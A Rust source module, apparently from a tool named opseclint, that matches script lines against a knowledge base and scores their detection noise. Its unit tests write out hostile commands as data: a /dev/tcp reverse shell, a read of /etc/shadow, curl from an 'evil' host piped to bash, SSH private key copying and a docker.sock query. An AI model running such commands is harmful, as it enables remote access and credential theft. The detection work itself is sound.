//! Walks parsed input, resolves each action against the knowledge base, and
//! produces a [`Report`] of detection-coverage findings.

use std::collections::HashSet;

use crate::kb;
use crate::model::{Finding, KnowledgeBase, Report, Severity};
use crate::parser::parse_line;

fn finding_from_entry(entry: &crate::model::KbEntry, line: usize) -> Finding {
    Finding {
        line,
        source: "opseclint".to_string(),
        rule_id: entry.id.clone(),
        description: entry.description.clone(),
        techniques: entry.techniques.clone(),
        telemetry: entry.telemetry.clone(),
        detections: entry.detections.clone(),
        noise: entry.noise,
        severity: Severity::from_noise(entry.noise),
    }
}

/// Analyze a full input (a script, playbook, or single line) against the KB.
pub fn analyze(input: &str, kb: &KnowledgeBase) -> Report {
    let mut findings = Vec::new();
    let mut lines_analyzed = 0;

    for (idx, raw_line) in input.lines().enumerate() {
        let line_no = idx + 1;
        let trimmed = raw_line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        lines_analyzed += 1;

        let commands = parse_line(raw_line);
        // Dedupe entries per line so a rule matched by multiple segments (or by
        // both a command and a raw match) is reported once.
        let mut seen: HashSet<&str> = HashSet::new();

        for entry in &kb.entries {
            let matched = if entry.command.is_some() {
                commands
                    .iter()
                    .any(|cmd| kb::command_entry_matches(entry, cmd))
            } else {
                kb::raw_entry_matches(entry, trimmed)
            };
            if matched && seen.insert(entry.id.as_str()) {
                findings.push(finding_from_entry(entry, line_no));
            }
        }
    }

    // Order findings loudest-first, then by line for stable output.
    findings.sort_by(|a, b| {
        b.noise
            .cmp(&a.noise)
            .then(a.line.cmp(&b.line))
            .then(a.rule_id.cmp(&b.rule_id))
    });

    let max_noise = findings.iter().map(|f| f.noise).max().unwrap_or(0);

    Report {
        platform: kb.platform.clone(),
        note: kb.note.clone(),
        findings,
        max_noise,
        lines_analyzed,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn kb() -> KnowledgeBase {
        kb::load().expect("embedded KB must parse")
    }

    #[test]
    fn detects_reverse_shell() {
        let report = analyze("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", &kb());
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "reverse-shell-devtcp")
        );
        assert!(report.max_noise >= 75);
    }

    #[test]
    fn detects_shadow_read() {
        let report = analyze("sudo cat /etc/shadow", &kb());
        assert!(report.findings.iter().any(|f| f.rule_id == "shadow-read"));
    }

    #[test]
    fn detects_curl_pipe_bash() {
        let report = analyze("curl http://evil/x.sh | bash", &kb());
        let ids: Vec<_> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
        assert!(ids.contains(&"curl"));
        assert!(ids.contains(&"pipe-to-shell"));
    }

    #[test]
    fn benign_line_is_quiet() {
        let report = analyze("echo hello world", &kb());
        assert!(report.findings.is_empty());
    }

    #[test]
    fn no_double_count_per_line() {
        // `id` appears twice on the line but should be reported once.
        let report = analyze("id && id", &kb());
        let count = report.findings.iter().filter(|f| f.rule_id == "id").count();
        assert_eq!(count, 1);
    }

    #[test]
    fn detects_private_key_theft() {
        let report = analyze("cp ~/.ssh/id_rsa /tmp/k", &kb());
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "private-key-rsa")
        );
    }

    #[test]
    fn detects_docker_socket_escape() {
        let report = analyze(
            "curl --unix-socket /var/run/docker.sock http://x/containers/json",
            &kb(),
        );
        assert!(report.findings.iter().any(|f| f.rule_id == "docker-sock"));
    }

    #[test]
    fn kb_all_entries_parse() {
        let kb = kb();
        assert!(
            kb.entries.len() >= 55,
            "expected a grown KB, got {}",
            kb.entries.len()
        );
    }
}
